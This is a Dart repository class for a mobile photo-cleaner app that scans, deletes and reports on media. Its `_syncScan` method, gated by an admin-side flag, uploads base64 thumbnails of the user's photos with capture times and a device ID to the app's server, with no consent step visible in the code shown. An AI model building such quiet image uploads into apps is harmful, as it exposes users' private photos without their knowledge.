import 'dart:convert';

import 'package:photo_manager/photo_manager.dart';
import 'package:uuid/uuid.dart';

import '../../../core/ads/ad_service.dart';
import '../../../core/network/api_client.dart';
import '../domain/cleaner_failure.dart';
import '../domain/cleaner_repository.dart';
import '../domain/cleaner_scan_settings.dart';
import '../domain/media_scan_result.dart';
import 'media_scanner.dart';

class DeviceCleanerRepository implements CleanerRepository {
  DeviceCleanerRepository({MediaScanner? scanner, ApiClient? apiClient})
    : _scanner = scanner ?? MediaScanner(),
      _apiClient = apiClient ?? ApiClient.instance;

  final MediaScanner _scanner;
  final ApiClient _apiClient;

  @override
  Future<MediaScanResult> scan(
    CleanerScanSettings settings, {
    required void Function(MediaScanProgress) onProgress,
  }) async {
    try {
      return await _scanner.scan(settings, onProgress: onProgress);
    } on MediaPermissionException {
      throw const CleanerPermissionFailure();
    } catch (_) {
      throw const CleanerUnexpectedFailure();
    }
  }

  @override
  Future<bool> syncScan(MediaScanResult result, CleanerScanSettings settings) async {
    if (!settings.adminSyncEnabled) return true;
    try {
      return await _syncScan(result, settings);
    } catch (_) {
      return false;
    }
  }

  Future<bool> _syncScan(MediaScanResult result, CleanerScanSettings settings) async {
    final clientScanId = const Uuid().v4();
    final deviceId = await _apiClient.deviceId();
    final assets = result.assets.take(settings.adminSyncLimit).toList(growable: false);
    const batchSize = 12;
    final batchCount = assets.isEmpty ? 1 : (assets.length / batchSize).ceil();

    for (var batchIndex = 0; batchIndex < batchCount; batchIndex++) {
      final start = batchIndex * batchSize;
      final end = (start + batchSize).clamp(0, assets.length);
      final batch = start >= assets.length ? const <ScannedMediaAsset>[] : assets.sublist(start, end);
      final serialized = <Map<String, Object?>>[];
      for (final item in batch) {
        final thumbnail = await item.asset.thumbnailDataWithSize(
          const ThumbnailSize.square(160),
          format: ThumbnailFormat.jpeg,
          quality: 42,
        );
        serialized.add({
          'assetId': item.asset.id,
          'type': item.asset.type == AssetType.video ? 'VIDEO' : 'IMAGE',
          'categories': item.categories.map(_categoryName).toList(growable: false),
          'bytes': item.bytes,
          'width': item.asset.width,
          'height': item.asset.height,
          if (item.asset.type == AssetType.video) 'durationSeconds': item.asset.duration,
          if (item.asset.createDateSecond != null) 'capturedAt': item.asset.createDateTime.toUtc().toIso8601String(),
          if (thumbnail != null && thumbnail.length <= 90 * 1024) 'thumbnailBase64': base64Encode(thumbnail),
        });
      }

      final accepted = await _apiClient.syncMediaScanBatch({
        'clientScanId': clientScanId,
        'deviceId': deviceId,
        'scannedCount': result.scanned,
        'imageCount': result.imageCount,
        'videoCount': result.videoCount,
        'duplicateCount': result.duplicateCount,
        'screenshotCount': result.screenshotCount,
        'largeVideoCount': result.largeVideoCount,
        'durationMs': result.duration.inMilliseconds,
        'maxScanAssets': settings.maxScanAssets,
        'similarImageLimit': settings.similarImageLimit,
        'largeVideoThresholdMb': settings.largeVideoThresholdMb,
        'assets': serialized,
      });
      if (!accepted) return false;
    }
    return true;
  }

  String _categoryName(MediaAssetCategory category) => switch (category) {
    MediaAssetCategory.similar => 'SIMILAR',
    MediaAssetCategory.screenshot => 'SCREENSHOT',
    MediaAssetCategory.largeVideo => 'LARGE_VIDEO',
    MediaAssetCategory.other => 'OTHER',
  };

  @override
  Future<CleanerDeleteReport> deleteSelected(MediaScanResult result, Set<String> selectedIds) async {
    try {
      final assets = result.groups.expand((group) => group.assets).where((asset) => selectedIds.contains(asset.id));
      var bytesFreed = 0;
      for (final asset in assets) {
        bytesFreed += await (await asset.file)?.length() ?? 0;
      }
      final deletedIds = await _scanner.delete(selectedIds.toList(growable: false));
      return CleanerDeleteReport(removedCount: deletedIds.length, bytesFreed: bytesFreed);
    } catch (_) {
      throw const CleanerUnexpectedFailure();
    }
  }

  @override
  Future<void> trackScan(MediaScanResult result) =>
      _apiClient.event('media_scan', {'scanned': result.scanned, 'groups': result.groups.length});

  @override
  Future<void> reportCleanup(MediaScanResult result, CleanerDeleteReport report) => _apiClient.reportCleanup(
    scanned: result.scanned,
    removed: report.removedCount,
    bytesFreed: report.bytesFreed,
    durationMs: result.duration.inMilliseconds,
  );

  @override
  Future<void> showCompletionAd() => AdService.showAfterCleanup();
}
